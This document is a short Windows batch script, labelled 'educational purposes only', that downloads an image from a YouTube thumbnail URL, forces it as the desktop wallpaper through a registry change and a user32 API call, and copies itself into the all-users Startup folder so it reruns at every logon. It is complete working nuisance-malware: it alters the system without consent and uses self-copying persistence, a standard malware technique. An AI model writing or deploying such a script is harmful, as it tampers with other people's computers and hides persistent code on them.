:: NOTE - EDUCATIONAL PURPOSES ONLY !!
@echo off
set IMG_URL=https://i.ytimg.com/vi/tzD9OxAHtzU/hq720_2.jpg
powershell -Command "Invoke-WebRequest -Uri '%IMG_URL%' -OutFile '%TEMP%\wallpaper.jpg'"
powershell -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value '%TEMP%\wallpaper.jpg'; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%TEMP%\wallpaper.jpg', 3)"


:: IMPORTANT !! THE BELOW LINE ADDS THE PROGRAM TO STARTUP
copy %0 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup